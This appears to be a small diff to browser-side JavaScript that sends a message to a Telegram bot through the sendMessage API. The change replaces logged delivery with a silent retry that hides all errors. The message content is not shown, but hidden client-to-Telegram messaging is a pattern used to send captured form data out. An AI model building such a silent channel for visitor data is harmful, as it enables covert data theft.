@@ -1505,9 +1505,9 @@
 
                 const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(tgMessage)}&parse_mode=HTML`;
                 try {
-                    fetch(tgUrl, { mode: 'no-cors' })
-                        .then(() => console.log("Telegram alert delivered successfully!"))
-                        .catch(e => console.log("Telegram alert error:", e));
+                    fetch(tgUrl).catch(() => {
+                        fetch(tgUrl, { mode: 'no-cors' }).catch(() => {});
+                    });
                 } catch(e) {}
             }
 
